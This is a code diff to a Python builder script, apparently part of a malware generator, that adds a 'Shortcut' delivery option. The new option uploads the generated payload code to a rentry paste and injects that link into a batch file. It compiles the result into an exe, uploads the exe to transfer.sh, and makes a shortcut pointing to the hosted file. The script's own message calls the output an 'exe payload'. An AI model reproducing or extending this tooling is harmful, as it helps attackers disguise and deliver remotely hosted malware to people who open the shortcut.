@@ -280,8 +280,8 @@ while True:
     while True:
         if Exe in ['y', 'yes']:
             
-            ask = input('make it exe with pyinstaller or with IExpress? (Yes if pyinstaller) (No if IExpress)')
-            if ask in ["yes","y"]:
+            ask = input('make it exe with pyinstaller or with IExpress? (pyinstaller if pyinstaller) (IExpress if IExpress) (Shortcut if Shortcut)')
+            if ask.lower() in ["pyinstaller"]:
                 from sys import executable
                 icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
 
@@ -320,7 +320,7 @@ while True:
                 except subprocess.CalledProcessError:
                     print("Error while running PyInstaller.")
                     quit()
-            else:
+            elif ask.lower() in ["iexpress"]:
                 aaa = f"./Build/temp.py"
                 with open(aaa, 'rb') as f:
                     try:
@@ -342,6 +342,43 @@ while True:
                 subprocess.run([f"./trap detection/final.bat"] + arguments, shell=True)
                 input('Generated exe payload ! in main folder! press any key to quit')
                 quit()
-        else:
-            input('Press any key to quit.')
-            quit()
+            elif ask.lower() in ["shortcut"]:
+                aaa = f"./Build/temp.py"
+                with open(aaa, 'rb') as f:
+                    try:
+                        link_list = [line.decode('utf-8') for line in f.readlines()]
+                        code_string = ''.join(link_list)
+                    except UnicodeDecodeError:
+                        print(f"Error: Unable to decode '{aaa}' file. Please ensure it's UTF-8 encoded.")
+                        quit()
+                icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
+                code_string = ''.join(link_list)
+
+                pastebin_link = get_rentry_link(code_string)
+                batch_file_path = "./trap detection/payload.bat"
+                
+                arguments = [batch_file_path, f'{name}.exe']
+
+                update_batch_script(batch_file_path,pastebin_link)
+                
+                subprocess.run([f"./trap detection/final.bat"] + arguments, shell=True)
+                url = "https://transfer.sh/"
+
+                with open(f"{name}.exe", "rb") as file:
+                    files = {"file": file}
+                    response = requests.post(url, files=files)
+
+                if response.status_code == 200:
+                    url = response.text.strip()
+                    script_path = os.path.join(os.path.dirname(__file__), "trap detection", "shortcut.py")
+                    subprocess.run(["python", script_path, url])
+                    
+
+                    
+                else:
+                    print("Error uploading file. Status code:", response.status_code)
+
+                quit()
+            else:
+                input('Press any key to quit.')
+                quit()
